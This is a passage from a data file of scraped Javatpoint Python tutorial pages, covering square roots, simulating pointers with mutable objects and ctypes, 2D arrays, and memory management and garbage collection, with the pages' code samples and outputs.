1. 0.]', '[0. 0. 0. 1. 0.]', '[1. 0. 0. 0. 0.]', '[0. 0. 0. 1. 0.]', '[0. 0. 1. 0. 0.]', '[0. 0. 1. 0. 0.]', '[0. 0. 0. 0. 1.]', '[1. 0. 0. 0. 0.]', '[0. 1. 0. 0. 0.]', '[0. 0. 1. 0. 0.]', '[0. 1. 0. 0. 0.]', '[0. 0. 0. 0. 1.]', '[0. 0. 0. 1. 0.]]', '1']","['Animal|||Categorical Value of Animal&&&Cat|||5&&&Dog|||10&&&Cow|||15&&&Camel|||11', 'Cat|||Dog|||Cow|||Camel&&&1|||0|||0|||0&&&0|||1|||0|||0&&&0|||0|||1|||0&&&0|||0|||0|||1']","['|||A ""car"" variable with the values: ""Maruti"" and ""Jaguar"".|||A ""food"" variable with the values: ""Veg"", and ""Non-Veg"".|||A ""place"" variable with the values: ""first"", ""second"", and ""third"".||||||Integer Encoding|||One-Hot Encoding|||']"
142,['How to write square root in Python?'],"['Python has a predefined sqrt() function that returns the square root of a number. It defines the square root of a value that multiplies itself to give a number. The sqrt() function is not used directly to find the square root of a given number, so we need to use a math module to call the sqrt() function in Python.']","['https://www.javatpoint.com/pointer-in-python', 'https://www.javatpoint.com/how-to-one-hot-encode-sequence-data-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/pointer-in-python', 'https://www.javatpoint.com/how-to-one-hot-encode-sequence-data-in-python', 'https://www.javatpoint.com/pointer-in-python']","['https://static.javatpoint.com/python/images/how-to-write-square-root-in-python.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python4.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python5.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python6.png', 'https://static.javatpoint.com/python/images/how-to-write-square-root-in-python7.png']",[],"['Using math.sqrt() method', 'Using math.pow() function', 'Using ** Operator']",[],[],"['For example, the square root of 144 is 12.', 'The sqrt() function is an inbuilt function that returns the square root of any number. Following are the steps to find the square root of a number.', ""Let's create a Python program to find the square root of a number."", 'SqrRoot.py', ""Let's create a python program that finds the square root of a decimal numbers."", 'SqrRoot.py', 'In the following program, we have read a number form the user and find the square root.', 'SqRoot_Usr.py', 'Pow_Sqrt.py', 'Following are the steps to find the square root of a number.', 'Step 1. Define a function and pass the value as an argument.', 'Step 2. If the defined number is less than 0 or negative, it returns nothing.', 'Step 3. Use the exponential ** sign to find the power of a number.', 'Step 4. Take the numeric value from the user.', 'Step 5. Call the function and store its output to a variable.', 'Step 6. Display the Square Root of a number in Python.', 'Step 7. Exit from the program.', ""Let's implement the above steps in a Python program and calculate the square root of a number."", 'SqrtFun.py', 'Sqrloop.py']","['The pow() is an inbuilt function that is used in Python to return the power of a number. It has two parameters. The first parameter defines the number and second parameter defines the power raise to that number.', 'We can also use the exponent operator to find the square root of the number. The operator can be applied between two operands. For example, x**y. It means that left operand raised to the power of right.', 'As we can see in the above example, first we take an input (number) from the user and then use the exponent ** operator to find out the power of a number. Where 0.5 is equal to √ (root symbol) to raise the power of a given number.', ""Let's create a Python program that finds the square root of between the specified range. In the following program, we have found the square root of all the number between 0 to 50.""]",[],"['import math # import math module', 'N = 25 # define the value to the variable N', 'result = math.sqrt(N) # use math.sqrt() function and pass the variable.', 'print("" Square root of 25 is :"", result) # prints the square root of a given number', 'M = 625 # define the value', 'result = math.sqrt(M) # use math.sqrt() function and pass the variable', 'print("" Square root of 625 is :"", result) # prints the square root of a given number', 'P = 144 # define the value', 'result = math.sqrt(P) # use math.sqrt() function and pass the variable', 'print("" Square root of 144 is :"", result) # prints the square root of a given number', 'S = 64 # define the value', 'result = math.sqrt(S) # use math.sqrt() function and pass the variable', 'print("" Square root of 64 is :"", result) # prints the square root of a given number', 'import math', 'print("" The Square root of 4.5 is"", math.sqrt(4.5)) # Pass the decimal number', 'print("" The Square root of 627 is"", math.sqrt(627)) # Pass the decimal number', 'print("" The Square root of 6.25 is"", math.sqrt(6.25)) # Pass the decimal number', 'print("" The Square root of 0 is"", math.sqrt(0)) # Pass number as 0', 'import math # import math module', 'a = int(input(""Enter a number to get the Square root"")) # take an input', 'res = math.sqrt(a) # Use math.sqrt() function and pass the variable a.', 'print(""Square root of the number is"", res) # print the Square Root', 'import math # import the math module', 'num = float(input(""Enter the number :"")) # take an input', 'SquareRoot = math.pow(num, 0.5) # Use the math.pow() function and pass the value and 0.5 (which is equal to √) as an parameters', 'print("" The Square Root of the given number {0} = {1}"" .format(num, SquareRoot)) # print the Square Root.', 'import math # import the math package or module', 'def sqrt_fun(num): # define the sqrt_fun() and pass the num as an argument', 'if num < 0:  # if num is less than 0 or negative, it returns nothing', 'return', 'else:', 'return num ** 0.5 # Use the exponent operator', 'num = int(input ("" Enter a numeric value: "") ) # take an input from the user', 'res = sqrt_fun(num) # call the sqrt_fun() to find the result', 'print(""  Square Root of the {0} = {1}"".format(num, res)) # print the Square Root of the variable', 'import math', 'for i in range(50):', 'print(""Square root of a number {0} = {1}"".format(i,math.sqrt(i)))']",[],[],['|||Start the program|||Define any number whose square root to be found.|||Invoke the sqrt() function and pass the value that you have defined in step 2 and store the result in a variable.|||Print the square root.|||Terminate the program.|||']
143,"[""Pointer in Python | Why Python doesn't support pointer""]","[""In this tutorial, we will learn about pointer in Python and see why Python doesn't support pointer concepts.""]","['https://www.javatpoint.com/python-2d-array', 'https://www.javatpoint.com/how-to-write-square-root-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-2d-array', 'https://www.javatpoint.com/how-to-write-square-root-in-python', 'https://www.javatpoint.com/python-2d-array']","['https://static.javatpoint.com/python/images/pointer-in-python.png', 'https://static.javatpoint.com/python/images/pointer-in-python2.png', 'https://static.javatpoint.com/python/images/pointer-in-python3.png']",[],"['What is Pointer?', ""Why Doesn't Python Support Pointers"", 'Objects in Python', 'Immutable vs. Mutable Objects', 'Understanding Python Variables', 'Names in Python', 'Simulating Pointers in Python', 'Python ctypes Module', 'Conclusion']","['Variables in C', 'Using Mutable Types as Pointer', 'Using Python Objects']",[],"[""We will also understand how we can simulate the pointer in Python. Below is the introduction of the pointer for those who don't have any about it."", ""We will also understand how we can simulate the pointer in Python. Below is the introduction of pointer for those who don't have any about it."", '""Pointers are the variables that hold the memory address of another variable. Pointer variables are represented by asterisk (*).""', ""Let's see the following example of the pointer in C programming language."", 'Example - How to use pointer in C', 'Before understanding the pointer in Python, we need to have the basic idea of the following points.', 'In Python, everything is an object, even class, functions, variables, etc. Each object contains at least three pieces of data.', ""Let's discuss one by one."", 'Reference Count - It is used for memory management. To get more information regarding Python memory management, read Memory Management in Python.', ""We can check the type of the above objects using the id() method. This method returns the object's memory address."", 'We are typing the below lines in a REPL environment.', 'In the above code, we have assigned the value 10 to x. if we modified this value with substitution, we would get the new objects.', ""As we can see, we modify the above code and get new objects as a response. Let's take another example of str."", ""Again, we modify the value of x by adding a new string, and we get the new memory address. Let's try to add string directly in s."", ""Above code returns error, it means string doesn't support the mutation. So str is the immutable objects."", 'Now, we will see the mutable object such as list.', ""Let's understand how the variable works in C and how the name works in Python."", 'If we represent the view of memory -', 'As we can see, the x has a memory location for the value 286. Now, we will assign the new value to x.', 'This new value overwrites the previous value. It means that the variable x is mutable.', 'The value location of x is same, but the value changed. It is a significant point indicating that x is the memory location, not just its name.', 'Now, we introduce the new variable that takes the x, then the y creates the new memory box.', 'The variable y creates new box called y copies the value of from x into the box.', 'The above code is broken down during execution.', 'It will look like as below.', 'Now, we introduce new variable and assign x to it.', 'If we increase the value of y by one, it will no longer refer to the same object.', ""That means, in Python, we don't assign variables. Instead, we bind names to reference."", ""Let's understand the given points."", 'In the above code, we defined pointer *a, then we increment the value by one. Now, we will implement it with the main() function.', 'We can simulate this type of behavior by using the Python mutable type. Understand the following example.', 'We used the tuple in the above code, an immutable object, so it returned the error. We can also use the dictionary to simulate the pointer in Python.', ""Let's understand the following example where we will count every operation that occurs in the program. We can use dict to achieve this."", 'Explanation - ', 'Here we need to increment these values.', 'Example - C Language', 'If we call the function using different type, it will through an error.', 'This is because the incrPointer requires a pointer and ctypes is a way of passing pointer in Python.', 'v is a C variable. The ctypes provides the method called byref() which used to pass the variable reference.', 'We have increased the value using the reference variable.']","[""Pointers tend to create complexity in the code, where Python mainly focuses on usability rather than speed. As a result, Python doesn't support pointer. However, Python gives some benefits of using the pointer."", 'Type - The CPython layer is used as the type to make sure type safety during runtime. Finally, there is a value, which is the actual value associated with the object.', ""Immutable objects cannot be modified, where Mutable objects can be modified. Let's see the following table of common types and whether or not they are mutable or not."", 'As we can see in the above code, the my_list has the id originally, and we have appended with 5 to the list; my_list has the same id because the list supports the mutability.', ""The way of defining variables in Python is much different than the C or C++. Python variable doesn't define the data type. In fact, Python has names, not variables."", 'So we need to understand the difference between variables and names and especially true when we are navigating the tricky subject of pointers in Python.', ""In C language, a variable is that it holds value or store value. It is defined with the data type. Let's see the following code that defines the variable."", ""As we discussed earlier Python doesn't have the variables. It has names, and we use this term as the variables. But there is a difference between variables and names. Let's see the following example."", ""We can understand the internal working of a variable in Python. The variable x points to the reference of the object and it doesn't have the memory space as before. It also shows x = 289 is binding the name x to a reference."", 'In Python, The variable y will not create the new object; it is just a new name pointing to the same object. The object refcount also increased by one. We can confirm it as follows.', ""As we have discussed, Python doesn't support pointer, but we can get the benefits of using a pointer. Python provides alternative ways to use the pointer in Python. These two ways are given below."", ""In the previous section, we have defined the mutable type objects; we can treat them as if they were pointers to simulate pointer behavior. Let's understand the following example."", 'In the above example, we have used the count dictionary, which kept track of the number of function calls. When the foo() function is called, the counter is increased 2 because dict is mutable.', ""In the previous example, we have used dict to emulate the pointer in Python, but sometimes it becomes difficult to remember all used key names. We can use the Python custom class in place of the dictionary. Let's understand the following example."", 'In the above code, we have defined the Pointer class. This class used dict for holding actual data in the _metrics member variable. It will provide mutability to our program. We can do this as follows.', ""We have used @property decorator. If you don't familiar with decorators, visit our Python decorator tutorial. The @property decorator will access funCalls and catPicture_served. Now, we will create an object of the Pointer class."", 'We have defined two new methods - increment(), and cat_pics(). We have modified the values using these functions in the matrices dict. Here, we can change the class the same as we are modifying the pointer.', ""Python ctypes module allows us to create a C-type pointer in Python. This module is helpful if we want to make a function call to a C library that requires a pointer. Let's understand the following example."", 'In the above function, we have incremented the value of x by one. Suppose we save the above file named incrPointer.c and the type following command in the terminal.', 'The first command compiles incrPointer.c into an object called incrPointer.o. The second command accepts object file and produce libinic.so to collaborate with ctypes.']","['Pointer is a very popular and useful tool to store the address of the variable. If someone has ever worked with a low-level language such as C. C++, he/she would probably be familiar with pointers. It manages the code very efficiently. It can be slightly tough for beginners, but it is a one of the important concept of the program. However, it can lead to various memory management bugs. Thus, the definition of pointers -', ""Besides being useful, pointers are not used in Python. In this topic, we will discuss Python's object model and learn why pointers in Python doesn't exist. We will also learn different ways to simulate pointers in Python. First, let's discuss why Python doesn't support Pointers."", 'The exact reason for not supporting the pointer is not clear. Could pointer in Python exist natively? The main concept of Python is its simplicity, but pointer violated the Zen of Python. Pointers are mainly encouraged implicit changes rather than explicit ones. They are also complex, especially for beginners.', 'If we go depth in this object, we will find not all objects are the same, though. The important distinction between the types of object is immutable and mutable. First of all, we need to understand the difference between the types of object because it explores the pointer in Python.', 'The above function accesses the first element of the list and increments its value by one. When we execute the above program, it prints the modified value of y. It means we can replicate the pointer using the mutable object. But if we try to simulate pointer using immutable object.', ""In the above code, the ctypes.CDLL returns a shared object called libinic.so. It contains the incrPointer() function. If we need to specify the pointer to the functions we define in a shared object, we have to specify it using the ctypes. Let's see the below example."", 'We have discussed that pointer is not present in the Python, but we can implement the same behavior with the *mutable object. We also discussed the ctypes modules that can define C pointer in Python. We have defined a few excellent ways to simulate pointer in Python.']","['#include', 'int main()', 'int* po, o;', '0 = 10;', 'printf(""Address of c: %p\\n"", &c);', 'printf(""Value of c: %d\\n\\n"", c);', 'o = &0;', 'printf(""Address of pointer pc: %p\\n"", o);', 'printf(""Content of pointer pc: %d\\n\\n"", *o);', '0 = 11;', 'printf(""Address of pointer pc: %p\\n"", p0);', 'printf(""Content of pointer pc: %d\\n\\n"", *p0);', '*po = 2;', 'printf(""Address of c: %p\\n"", &o);', 'printf(""Value of c: %d\\n\\n"", o);', 'return 0;', 's = ""java""', 'print(id(s))', 's += ""Tpoint""', 'print(s)', ""s = 'java'"", 's[0] = T', 'print(id(s))', 'my_list = [3, 4, 8]', 'print(id(my_list))', 'my_list.append(4)', 'print(my_list)', 'print(id(my_list))', 'int x = 286;', 'int y = x;', 'x = 289', 'void add_one(int *a) {', '*a += 1;', '#include', 'int main(void) {', 'int y = 233;', 'printf(""y = %d\\n"", y);', 'add_one(&y);', 'printf(""y = %d\\n"", y);', 'return 0;', 'def add_one(x):', 'x[0] += 1', 'y = [2337]', 'add_one(y)', 'z = (2337,)', 'add_one(z)', 'count = {""funcCalls"": 0}', 'def car():', 'count[""funcCalls""] += 1', 'def foo():', 'count[""funCcalls""] += 1', 'car()', 'count[""funcCalls""]', 'class Pointer(object):', 'def __init__(self):', 'self._metrics = {', '""funCalls"": 0,', '""catPictures"": 0,', '}', 'class Pointer(object):', '# ...', '@property', 'def funCalls(self):', 'return self._metrics[""func_calls""]', '@property', 'def catPictures_served(self):', 'return self._metrics[""cat_pictures_served""]', 'pt = Pointer()', 'pt.funCalls()', 'pt.catPicture_served', 'class Pointer(object):', '# ...', 'def increament(self):', 'self._metrices[""funCalls""] += 1', 'def cat_pics(self):', 'self._metrices[""catPictures_served""] += 1', 'pt = Pointer()', 'pt.increment()', 'pt.increment()', 'pt.funCalls()', 'void incr_one(int *x) {', '*x += 1;', '$ gcc -c -Wall -Werror -fpic incrPointer.c', '$ gcc -shared -o libinc.so incrPointer.o', 'import ctypes', '##  libinc.so library should be same directory as this program', 'lib = ctypes.CDLL(""./libinc.so"")', 'lib.increment', 'inc = lib.increment', '## defining the argtypes', 'inc.argtypes = [ctypes.POINTER(ctypes.c_int)]', 'incrPointer(10)', 'v = ctypes.c_int(10)', 'inc(ctypes.byref(a))']","['Address of o: 2686784', 'Value of o: 22', 'Address of pointer po: 2686784', 'Content of pointer po: 22', 'Address of pointer po: 2686784', 'Content of pointer po: 11', 'Address of o: 2686784', 'Value of o: 2', '140720979625920', '140720979625888', '2315970974512', 'JavaTpoint', '1977728175088', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/MyPythonProject/python1.py"", line 34, in', 's[0] = T', ""NameError: name 'T' is not defined"", '2571132658944', '[3, 4, 8, 4]', '2571132658944', 'True', 'y = 233', 'y = 234', 'Traceback (most recent call last):', 'File """", line 1, in', 'File """", line 2, in add_one', ""TypeError: 'tuple' object does not support item assignment"", '2', '<_FuncPtr object at 0x7f46bf6e0750>', 'Traceback (most recent call last):', 'File ""<stdin>"", line 1, in <module>', ""ctypes.ArgumentError: argument 1: <class 'TypeError'>: expected LP_c_int instance instead of int"", 'c_int(11)']",['Objects|||Type&&&Int|||Immutable&&&Float|||Immutable&&&Bool|||Immutable&&&List|||Mutable&&&Set|||Mutable&&&Complex|||Mutable&&&Tuple|||Immutable&&&Frozenset|||Immutable&&&Dict|||Mutable'],['|||Immutable vs. mutable objects|||Python variables/names||||||Reference count|||Type|||Value||||||Allocate enough memory for an integer.|||We assign the value 286 to that memory location.|||The x represents that value.||||||Using mutable types as pointers|||Using custom Python objects|||&&&|||Create a PyObject|||Set the typecode to integer for the PyObject|||Set the value to 289 for the PyObject|||Create a name called x|||Point x to the new PyObject|||Increase the refcount of the PyObject by 1|||']
144,['Python 2D array'],"[""An array is a collection of linear data structures that contain all elements of the same data type in contiguous memory space. It is like a container that holds a certain number of elements that have the same data type. An array's index starts at 0, and therefore, the programmer can easily obtain the position of each element and perform various operations on the array. In this section, we will learn about 2D (two dimensional) arrays in Python.""]","['https://www.javatpoint.com/python-memory-management', 'https://www.javatpoint.com/pointer-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-arrays', 'https://www.javatpoint.com/python-memory-management', 'https://www.javatpoint.com/pointer-in-python', 'https://www.javatpoint.com/python-memory-management']","['https://static.javatpoint.com/python/images/python-2d-array.png', 'https://static.javatpoint.com/python/images/python-2d-array2.png', 'https://static.javatpoint.com/python/images/python-2d-array3.png', 'https://static.javatpoint.com/python/images/python-2d-array4.png', 'https://static.javatpoint.com/python/images/python-2d-array5.png', 'https://static.javatpoint.com/python/images/python-2d-array6.png', 'https://static.javatpoint.com/python/images/python-2d-array7.png', 'https://static.javatpoint.com/python/images/python-2d-array8.png']",[],[],"['Two-Dimensional Array (2D Array)', 'Access Two-Dimensional Array', 'Traversing the element in 2D (two dimensional)', 'Insert elements in a 2D (Two Dimensional) Array', 'Update elements in a 2 -D (Two Dimensional) Array', 'Delete values from a 2D (two Dimensional) array in Python', 'Size of a 2D array']",[],"['Where m is the row and n is the column of the table.', ""Let's create a simple program to understand 2D (two dimensional) arrays in Python."", '2dSimple.py', 'Program.py', ""We can insert elements into a 2 D array using the insert() function that specifies the element' index number and location to be inserted."", 'Create a program to update the existing value of a 2D array in Python.', ""Let's understand the len() function to get the size of a 2-dimensional array in Python."", 'Write a program to print the sum of the 2-dimensional arrays in Python.']","['A 2D array is an array of arrays that can be represented in matrix form like rows and columns. In this array, the position of data elements is defined with two indices instead of a single index.', ""In a 2D array, the existing value of the array can be updated with a new value. In this method, we can change the particular value as well as the entire index of the array. Let's understand with an example of a 2D array, as shown below."", ""In a 2- D array, we can remove the particular element or entire index of the array using del() function in Python. Let's understand an example to delete an element."", 'A len() function is used to get the length of a two-dimensional array. In other words, we can say that a len() function determines the total index available in 2-dimensional arrays.']","['In Python, we can access elements of a two-dimensional array using two indices. The first index refers to the indexing of the list and the second index refers to the position of the elements. If we define only one index with an array name, it returns all the elements of 2-dimensional stored in the array.', 'In the above example, we passed 1, 0, and 2 as parameters into 2D array that prints the entire row of the defined index. And we have also passed student_dt[3][4] that represents the 3rd index and 4th position of a 2-dimensional array of elements to print a particular element.']","['Array_name = [rows][columns] # declaration of 2D array', 'Arr-name = [ [m1, m2, m3, … . mn], [n1, n2, n3, … .. nn] ]', 'Student_dt = [ [72, 85, 87, 90, 69], [80, 87, 65, 89, 85], [96, 91, 70, 78, 97], [90, 93, 91, 90, 94], [57, 89, 82, 69, 60] ]', '#print(student_dt[])', 'print(Student_dt[1]) # print all elements of index 1', 'print(Student_dt[0]) # print all elements of index 0', 'print(Student_dt[2]) # print all elements of index 2', 'print(Student_dt[3][4]) # it defines the 3rd index and 4 position of the data element.', '# write a program to traverse every element of the two-dimensional array in Python.', 'Student_dt = [ [72, 85, 87, 90, 69], [80, 87, 65, 89, 85], [96, 91, 70, 78, 97], [90, 93, 91, 90, 94], [57, 89, 82, 69, 60] ]', '# Use for loop to print the entire elements of the two dimensional array.', 'for x in Student_dt:  # outer loop', 'for i in x:  # inner loop', 'print(i, end = "" "") # print the elements', 'print()', '# Write a program to insert the element into the 2D (two dimensional) array of Python.', 'from array import * # import all package related to the array.', 'arr1 = [[1, 2, 3, 4], [8, 9, 10, 12]]  # initialize the array elements.', 'print(""Before inserting the array elements: "")', 'print(arr1) # print the arr1 elements.', '# Use the insert() function to insert the element that contains two parameters.', 'arr1.insert(1, [5, 6, 7, 8])  # first parameter defines the index no., and second parameter defines the elements', 'print(""After inserting the array elements "")', 'for i in arr1: # Outer loop', 'for j in i: # inner loop', 'print(j, end = "" "") # print inserted elements.', 'print()', 'from array import * # import all package related to the array.', 'arr1 = [[1, 2, 3, 4], [8, 9, 10, 12]]  # initialize the array elements.', 'print(""Before inserting the array elements: "")', 'print(arr1) # print the arr1 elements.', 'arr1[0] = [2, 2, 3, 3] # update the value of the index 0', 'arr1[1][2] = 99 # define the index [1] and position [2] of the array element to update the value.', 'print(""After inserting the array elements "")', 'for i in arr1: # Outer loop', 'for j in i: # inner loop', 'print(j, end = "" "") # print inserted elements.', 'print()', 'from array import * # import all package related to the array.', 'arr1 = [[1, 2, 3, 4], [8, 9, 10, 12]]  # initialize the array elements.', 'print(""Before Deleting the array elements: "")', 'print(arr1) # print the arr1 elements.', 'del(arr1[0][2]) # delete the particular element of the array.', 'del(arr1[1]) # delete the index 1 of the 2-D array.', 'print(""After Deleting the array elements "")', 'for i in arr1: # Outer loop', 'for j in i: # inner loop', 'print(j, end = "" "") # print inserted elements.', 'print()', 'array_size = [[1, 3, 2],[2,5,7,9], [2,4,5,6]] # It has 3 index', 'print(""The size of two dimensional array is : "")', 'print(len(array_size)) # it returns 3', 'array_def = [[1, 3, 2], [2, 4, 5, 6]] # It has 2 index', 'print(""The size of two dimensional array is : "")', 'print(len(array_def)) # it returns 2', 'def two_d_matrix(m, n): # define the function', 'Outp = []  # initially output matrix is empty', 'for i in range(m): # iterate to the end of rows', 'row = []', 'for j in range(n): # j iterate to the end of column', 'num = int(input(f ""Enter the matrix [{0}][{j}]""))', 'row.append(num) # add the user element to the end of the row', 'Outp.append(row) # append the row to the output matrix', 'return Outp', 'def sum(A, B): # define sum() function to add the matrix.', 'output = [] # initially, it is empty.', 'print(""Sum of the matrix is :"")', 'for i in range(len(A)): # no. of rows', 'row = []', 'for j in range(len(A[0])): # no. of columns', '', 'row.append(A[i][j] + B[i][j]) # add matrix A and B', 'output.append(row)', 'return output    # return the sum of both matrix', 'm = int(input(""Enter the value of m or Row\\n"")) # take the rows', 'n = int(input(""Enter the value of n or columns\\n"")) # take the columns', 'print(""Enter the First matrix "") # print the first matrix', 'A = two_d_matrix(m, n) # call the matrix function', 'print(""display the first (A) matrix"")', 'print(A) # print the matrix', 'print(""Enter the Second (B) matrix "")', 'B = two_d_matrix(m, n) # call the matrix function', 'print(""display the Second (B) matrix"")', 'print(B) # print the B matrix', 's= sum(A, B) # call the sum function', 'print(s) # print the sum of A and B matrix.']","['Array_name = [rows][columns] # declaration of 2D array', 'Arr-name = [ [m1, m2, m3, … . mn], [n1, n2, n3, … .. nn] ]']",[],[]
145,['Python Memory Management'],"['In this tutorial, we will learn how Python manages the memory or how Python handles our date internally. We will dive deep into this topic to understand internal working of Python and how it handles the memory.']","['https://www.javatpoint.com/python-libraries-for-data-visualization', 'https://www.javatpoint.com/python-2d-array', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/heap-sort-in-python', 'https://www.javatpoint.com/python-libraries-for-data-visualization', 'https://www.javatpoint.com/python-2d-array', 'https://www.javatpoint.com/python-libraries-for-data-visualization']","['https://static.javatpoint.com/python/images/python-memory-management.png', 'https://static.javatpoint.com/python/images/python-memory-management2.png', 'https://static.javatpoint.com/python/images/python-memory-management3.png']",[],"['Introduction', 'Python Memory Allocation', 'Default Python Implementation', 'Python Garbage Collector', 'Python Objects in Memory', 'Reference Counting in Python', 'Transforming the Garbage Collector', 'Importance of Performing Manual Garbage Collection', 'C Python Memory Management', 'Common Ways to Reduce the Space Complexity']","['Static Memory Allocation -', 'Dynamic Memory Allocation', 'Conclusion']","['Note - Virtual Machines are not the physical computer, but they are instigated in the software.']","['Stack Allocation', 'Heap Memory Allocation', ""In the below example, we define how the function's variable store in the stack and a heap."", ""Let's understand the following example."", ""Hence, Python garbage collector works automatically and the programmers doesn't need to worry about it, unlike C."", 'This is highly beneficial to preserve the memory, which can be used by another variable.', 'When we assign the value to the x. the integer object 10 is created in the Heap memory and its reference is assigned to x.', 'Now, see another example.', 'The garbage collector comes into action if the threshold of the number of allocations minus the number of de-allocation is exceeded.', 'In the above output, the threshold value 700 is for the first generation and other values for the second and third generation.', 'The threshold value for trigger the garbage collector can be modified using the set_threshold() method.', 'Example - 2', 'Python garbage collector handles the low-level details for the developer.', ""Let's understand the following example -"", 'To accomplish that, we will use the gc.collect() function for the gc module.', 'The above code will give the number of collected and de-allocated objects.', 'We can perform the manual garbage collector using the two methods - time-based or event-based garbage collection.', ""In the even-based garbage collection, the gc.collect() function calls after an event occur. Let's understand the following example."", 'In this section, we will discuss the C Python memory architecture in detail.', 'There are three main components of the CPython memory allocation strategy.', 'The best way to avoid the developer should try to use the separate variable to track indices instead of slicing a list.', ""Let's run the following example."", 'It will create variable a to refer to the string object, which is the string value information.', 'Generators are the special functions used to create the iterator function.']","['This tutorial will give a deep understanding of Python memory management. When we execute our Python script, there are so many logic runs behind in Python memory to make the code efficient.', 'In Python, memory is managed by the Python manager which determines where to put the application data in the memory. So, we must have the knowledge of Python memory manager to write efficient code and maintainable code.', 'On the other side, when data is no longer use, it can be deleted by the Python memory manager. But the question is, how? And where did this memory come from?', ""Memory allocation is an essential part of the memory management for a developer. This process basically allots free space in the computer's virtual memory, and there are two types of virtual memory works while executing programs."", 'Static memory allocation happens at the compile time. For example - In C/C++, we declare a static array with the fixed sizes. Memory is allocated at the time of compilation. However, we cannot use the memory again in the further program.', ""Call stack (stack data structure) holds the program's operational data such as subroutines or function call in the order they are to be called. These functions are popped up from the stack when we called."", 'As we know, everything in Python is an object means dynamic memory allocation inspires the Python memory management. Python memory manager automatically vanishes when the object is no longer in use.', ""Basically, Python language is written in the English language. However, it is defined in the reference manual that isn't useful by itself. So, we need an interpreter based code on the rule in the manual."", ""The benefit of the default implementation, it executes the Python code in the computer and it also converts our Python code into instruction. So, we can say that Python's default implementation fulfills the both requirements."", 'The program that we write using Python language first converts into the computer-relatable instructions bytecode. The virtual machine interprets this bytecode.', 'As we can see in the above output, we assigned the value to object x and printed it. When we remove the object x and try to access in further code, there will be an error that claims that the variable x is not defined.', 'In the above code, we have assigned y = x, which means the y object will refer to the same object because Python allocated the same object reference to new variable if the object is already exists with the same value.', 'The variables x and y are not referring the same object because x is incremented by one, x creates the new reference object and y still referring to 10.', ""We can modify the threshold value manually using the GC module. This module provides the get_threshold() method to check the threshold value of a different generation of the garbage collector. Let's understand the following example."", 'The gc.collect() method is used to perform the time-based garbage collection. This method is called after a fixed time interval to perform time-based garbage collection.', 'As we discussed earlier, there is a layer of abstraction from the physical hardware to Python. Various application or Python access the virtual memory that is created by the operating system.', 'Python uses a portion of the memory for internal use and non-object memory. Another part of the memory is used for Python object such as int, dict, list, etc.', ""Arena - It is the largest chunks of memory and aligned on a page boundary in memory. The operating system uses the page boundary which is the edge of a fixed-length contiguous chuck of memory. Python assumes the system's page size is 256 kilobytes."", 'Blocks - Pools contains a pointer to their ""free"" block of the memory. In the pool, there is a pointer, which indicates the free block of memory. The allocator doesn\'t touch these block until it\'s actually needed.', 'We can follow some best practices to reduce the space complexity. These techniques are supposed to save quite space and make the program efficient. Below are a few practices in Python for memory allocators.', 'Hence, list slicing generates the copies of the object in the list. It just copies the reference to them. As a result, the Python memory allocator creates a copy of the object and allocates it. So we need to avoid the list slicing.', 'The developer should try to use the ""for item in array"" instead of ""for index in range(len(array))"" to save space and time. If our program doesn\'t need the indexing of the list element, then don\'t use it.', 'Each string needs a fixed size of memory based on the character and its length. When we change the string, it needs a different amount of memory and requires reallocating.', ""Then we add the new sting in it using the '+' operator. Python reallocates the new string in the memory based on its size and length. Suppose the original string's memory size is n byte, then the new string will be the m bytes."", 'Instead of using the string concatenation, we can use the"" .join(iterable_object)"" or format or %. This makes a huge impact on saving memory and time.', 'Iterators are very helpful for both time and memory when working on a large set of data. Working with the large dataset, we need data processing immediately and can wait for the program to process the entire data set first.', ""In the following example, we implement an iterator that calls the special generator function. The yield keyword returns the current value, moving to the next value only on the loop's next iteration."", 'If we use methods that have already been predefined in the Python library, then import the corresponding library. It would save a lot of space and time. We can also create a module to define the function and import it to the current working program.']","['Memory management is very important for software developers to work efficiently with any programming language. As we know, Python is a famous and widely used programming language. It is used almost in every technical domain. In contrast to a programming language, memory management is related to writing memory-efficient code. We cannot overlook the importance of memory management while implementing a large amount of data. Improper memory management leads to slowness on the application and the server-side components. It also becomes the reason of improper working. If the memory is not handled well, it will take much time while preprocessing the data.', ""Let's assume memory looks like an empty book and we want to write anything on the book's page. Then, we write data any data the manager find the free space in the book and provide it to the application. The procedure of providing memory to objects is called allocation."", ""The Stack data structure is used to store the static memory. It is only needed inside the particular function or method call. The function is added in program's call stack whenever we call it. Variable assignment inside the function is temporarily stored in the function call stack; the function returns the value, and the call stack moves to the text task. The compiler handles all these processes, so we don't need to worry about it."", 'Unlike static memory allocation, Dynamic memory allocates the memory at the runtime to the program. For example - In C/C++, there is a predefined size of the integer of float data type but there is no predefine size of the data types. Memory is allocated to the objects at the run time. We use the Heap for implement dynamic memory management. We can use the memory throughout the program.', 'Heap data structure is used for dynamic memory which is not related to naming counterparts. It is type of memory that uses outside the program at the global space. One of the best advantages of heap memory is to it freed up the memory space if the object is no longer in use or the node is deleted.', ""Python is an open-source, object-oriented programming language which default implemented in the C programming language. That's very interesting fact - A language which is most popular written in another language? But this is not a complete truth, but sort of."", ""As we have explained earlier, Python removes those objects that are no longer in use or can say that it frees up the memory space. This process of vanish the unnecessary object's memory space is called the Garbage Collector. The Python garbage collector initiates its execution with the program and is activated if the reference count falls to zero."", ""When we assign the new name or placed it in containers such as a dictionary or tuple, the reference count increases its value. If we reassign the reference to an object, the reference counts decreases its value if. It also decreases its value when the object's reference goes out of scope or an object is deleted."", 'As we know, Python uses the dynamic memory allocation which is managed by the Heap data structure. Memory Heap holds the objects and other data 